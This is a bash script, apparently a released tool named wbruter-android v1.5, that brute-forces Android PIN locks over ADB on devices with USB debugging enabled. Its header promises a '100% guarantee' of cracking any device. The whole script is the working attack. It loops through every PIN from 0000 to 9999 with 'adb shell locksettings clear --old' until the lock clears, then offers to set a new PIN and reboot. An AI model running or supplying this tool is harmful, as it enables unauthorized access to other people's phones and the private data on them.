#!/bin/bash
####
#### Copyright (C) 2019  wuseman <wuseman@nr1.nu> - All Rights Reserved
#### Last revised 14012019
#### GNU GENERAL PUBLIC LICENSE
#### License: GPL 3.0
#### Description: Bruteforce tool for android devices with 100% guarantee 
####              to crack the current pinlock on any android device aslong usb debugging has been enable
#### Usage: ./wbruter-android-v1.5.sh
####

isphoneconnected="$(adb devices | sed '1d' | sed '/^$/d')"
 if [ ! $isphoneconnected 2> /dev/null ]; then
      echo "Your device is not connected properly.."
      exit
fi

cr=`echo $'\n.'`
cr=${cr%.}
        printf "%52s\n" | tr ' ' '-'
        echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
        printf "%52s\n" | tr ' ' '-'
        sleep 2
for i in {0000..9999}; do
if [[ -z $(adb shell locksettings clear --old $i | grep "Lock credential cleared") ]]; then
printf "Wrong PIN: \e[1;31m$i\e[0m\n"
else
printf "\nPIN Code Has Been Found: \e[1;32m$i\e[0m\n\n"
printf "Do you want to set a new PIN "; read -p "(y/N): " newpin
case $newpin in
     y) read -p "Pin: " newpin2
        adb shell locksettings set-pin $newpin2 
        printf "\nIt is required to restart your device after\n"
        printf "PIN code has been set after old pin was erased..\n\n"
        ;;
     N)
	printf "\nIt is required to restart your device after\n"
        printf "PIN code has been erased from your device..\n\n";
        ;;
esac
        read -p "restart device (y/N): " rebootornot
case $rebootornot in
     y) adb shell reboot; printf "\nRebooting device, use pin '$newpin2' for unlock device..\n\n" ;;
     N) printf "\nPin was cracked by wbruter v1.5\n\n";exit 0 ;;
esac
exit
fi
done
